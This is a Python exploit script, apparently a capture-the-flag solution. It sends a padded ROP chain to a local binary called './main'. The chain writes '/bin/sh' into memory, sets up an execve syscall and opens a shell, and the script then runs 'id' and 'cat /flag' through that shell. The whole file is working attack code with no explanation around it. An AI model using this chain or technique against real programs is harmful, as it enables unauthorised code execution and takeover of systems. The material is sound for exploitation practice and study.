from subprocess import PIPE, Popen
from struct import pack
import fcntl
import time
import os
import sys

proc = Popen("./main", bufsize = 0, stdin=PIPE)
offset = input("offset>")

offset = offset - 0x58560

padding = 72 #int(sys.argv[1])
print(str(padding))
# Padding goes here
p = "A"*padding

p += pack('<Q', offset + 0x0000000000106725) # pop rdx ; ret
p += pack('<Q', offset + 0x00000000001bb1a0) # @ .data
p += pack('<Q', offset + 0x000000000003a638) # pop rax ; ret
p += '/bin/sh\x00'
p += pack('<Q', offset + 0x000000000003062c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', offset + 0x0000000000106725) # pop rdx ; ret
p += pack('<Q', offset + 0x00000000001bb1a8) # @ .data + 8
p += pack('<Q', offset + 0x0000000000098385) # xor rax, rax ; ret
p += pack('<Q', offset + 0x000000000003062c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', offset + 0x0000000000023a5f) # pop rdi ; ret
p += pack('<Q', offset + 0x00000000001bb1a0) # @ .data
p += pack('<Q', offset + 0x000000000002440e) # pop rsi ; ret
p += pack('<Q', offset + 0x00000000001bb1a8) # @ .data + 8
p += pack('<Q', offset + 0x0000000000106725) # pop rdx ; ret
p += pack('<Q', offset + 0x00000000001bb1a8) # @ .data + 8
p += pack('<Q', offset + 0x0000000000098385) # xor rax, rax ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x00000000000b4c90) # add rax, 1 ; ret
p += pack('<Q', offset + 0x0000000000024104) # syscall

#proc.communicate(p+"\n"+"\\bin\\ls \\\n\n\n")
proc.stdin.write(p+"\n")
time.sleep(1)
proc.stdin.write("id\n")
proc.stdin.write("cat /flag\n")
print("exit: " + str(proc.returncode))
